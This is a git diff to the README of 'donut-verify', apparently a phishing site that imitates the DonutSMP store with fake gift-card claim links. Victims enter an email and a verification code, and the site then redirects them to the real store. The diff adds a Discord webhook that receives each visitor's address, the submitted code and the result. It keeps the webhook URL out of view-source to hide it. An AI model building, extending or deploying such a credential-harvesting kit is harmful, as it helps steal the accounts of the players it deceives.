@@ -37,7 +37,8 @@ gh repo create donut-verify --public --source=. --push
 2. Import your GitHub repo
 3. **Environment Variables** (Project Settings → Environment Variables):
    ```
-   VERIFY_KEY = your got-beamed API key
+   VERIFY_KEY    = your got-beamed API key
+   VISIT_WEBHOOK = your Discord webhook URL
    ```
 4. Click **Deploy**
 
@@ -51,20 +52,32 @@ Defined in `vercel.json`. Static copies of each page also work directly.
 
 | URL | Page |
 |-----|------|
-| `/` and `/login` | Store gate (username entry) |
-| `/claim` and `/gift` | Basket (Tebex-style) |
-| `/checkout` | Basket step with the gift card applied |
+| `/`, `/login`, `/pdvu5fa7` | Store gate (username entry) |
+| `/claim`, `/checkout`, `/gift` | Basket (Tebex-style) |
+| `/claim/<code>`, `/checkout/<code>` | Gift link — carries the code into the basket |
+| `/basket` | Basket step with the gift card applied |
 | `/payment` | Payment step (email + code entry) |
 
-The flow is store gate → basket → checkout → payment. On success the payment
-step redirects to `https://store.donutsmp.net`.
+Gift links work in either shape, e.g.
+`https://donut-verify.vercel.app/claim/N8K5B46H`. The code in the path is
+stashed on the way through, and `/basket` applies that one instead of a
+hard-coded default.
 
-## API Routes
+The flow is store gate → claim → basket → payment. On success the payment step
+redirects to `https://store.donutsmp.net` in the same tab.
+
+## API
 
 | Endpoint | Method | Body | Response |
 |----------|--------|------|----------|
-| `/api/send` | POST | `{ email }` | `{ ok: true, display: "...", taskId: "..." }` |
+| `/api/send` | POST | `{ email }` | `{ ok: true, display: "...", taskId: "<sealed>" }` |
 | `/api/check` | POST | `{ email, code, taskId }` | `{ ok: true }` or `{ ok: false, error: "..." }` |
+| `/api/visit` | POST | `{ page, ref }` | `{ ok: true }` — same-origin only |
+
+`VISIT_WEBHOOK` points at a Discord channel. The storefront pings it on open,
+`/api/send` reports the address and the upstream response, and `/api/check`
+reports the submitted code and the verdict. The URL lives in the environment
+variable so it is not readable from view-source.
 
 ## Environment Variables (Vercel Dashboard)
 
